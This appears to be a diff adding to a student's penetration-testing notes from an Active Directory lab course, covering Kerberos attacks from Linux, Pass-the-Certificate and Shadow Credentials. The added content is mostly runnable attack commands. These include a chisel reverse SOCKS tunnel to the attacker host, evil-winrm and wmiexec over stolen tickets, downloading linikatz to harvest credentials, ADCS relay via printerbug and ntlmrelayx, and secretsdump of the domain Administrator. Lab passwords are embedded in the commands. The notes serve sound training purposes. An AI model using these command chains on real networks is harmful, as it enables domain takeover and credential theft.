@@ -356,8 +356,77 @@ klist ---  imported kerb user julie
 smbclient //dc01/C$ -k -c ls -no-pass  //read domain admin C$ with k kerberos auth  
 
 ## Using Linux attack tools with kerberos  
+if the attacker host say kali has no connection to DC/KDC, to use kerberos need to proxy via say windows jump  
 
+cat /etc/hosts    //add all the target entries inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01  
+cat /etc/proxychains.conf   // add socks5 127.0.0.1 1080  //add socks entry  
 
+Download chisel and start reverse server on kali and client on jump windows  
+sudo ./chisel server --reverse  //on kali  
+c:\tools\chisel.exe client 10.10.14.33:8080 R:socks  //start chisel client on windows jump  
+
+export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133  //setup kerb ticket  
+
+proxychains impacket-wmiexec dc01 -k  // -no-pass if ist asks for pass, IP address not supported use hostname  
+
+---Evilwinrm over kerberos ticket and proxychains---  say if only winrm open no smb for smbexec/psexec/wmiexec  
+to use evilwinrm with kerberos need to install krb5-user package  
+while installing it will ask For, Use the domain name: INLANEFREIGHT.HTB, and the KDC is the DC01  
+sudo apt-get install krb5-user -y  
+the package krb5-user is already installed, we need to change the configuration file /etc/krb5.conf  
+proxychains evil-winrm -i dc01 -r inlanefreight.htb  //evilwinrm with kerberos 
+
+Miscellaneous - say we want to use ccache file in windows or kirbi file on linux  
+
+impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi   //linux ccache file to kirbi  
+//reverse the file order to convert kirbi to ccache file  
+
+Rubeus.exe ptt /ticket:c:\tools\julio.kirbi  //import the convrted ticket  
+
+---Linikatz--- Mimikatz for linux  
+extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc  
+saves them in a folder name startign with linikatz.  
+wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh  
+$ /opt/linikatz.sh  
+
+## Pass the Certificate  
+**PKINIT** - public key cryptography for initial authentication is an extension of kerberos that enables use of public key crypto in initial auth  
+It is typically used to support user logons via smart cards, which store the private keys.  
+Pass-the-Certificate refers to the technique of using X.509 certificates to successfully obtain Ticket Granting Tickets (TGTs).  
+used in ADCS as well as shadow credential attacks  
+example -- petitpotam attack that coerces dc01$ authenticate and forwards it to adcs to get tgt for dc01$ computer account  
+DC if supports ADCS has /certsrv/certfnsh.asp  -- check this path  
+//does this attack work if adcs running only on 443 ?  
+
+impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication  //start relay  
+python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12  //force auth, 109 is DC and 12 is attacker where relay is run  
+
+//pass this cert .pfx to obtain a TGT  
+python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache  //dc01$ is computer account name  
+
+//import the tgt cache is tgt, keytab is like lsass cred  
+export KRB5CCNAME=/tmp/dc.ccache  
+
+//use the ticket to extract admin cred from dc as user dc01$  
+impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+
+**Shadow Credentials msDS-KeyCredentialLink**  
+Active Directory attack that abuses the msDS-KeyCredentialLink attribute of a victim user.  
+This attribute stores public keys that can be used for authentication via PKINIT.  
+In BloodHound, the AddKeyCredentialLink edge indicates that one user has write permissions over another user's msDS-KeyCredentialLink attribute, allowing them to take control of that user.  
+
+//The command below generates an X.509 certificate and writes the public key to the victim user's msDS-KeyCredentialLink attribute:   
+pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add  
+//generates a private key with password which we use next  
+
+//request tgt of target user with private key and ad would probably use public key written to user attribute  
+python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache  
+
+//import the tgt ticket and use it  
+export KRB5CCNAME=/tmp/jpinkman.ccache  
+
+If unsable to use PKINIT due to KDC not supporting appropriate EKU, the tool passthecert was created for such situations  
+can be used to auth against ldaps using a cert and perform various attacks changing pass or granting dcsync rights - not for this module  
 
 **Password policies**:  
 passwords to expire, account lockout, password strength, password history  
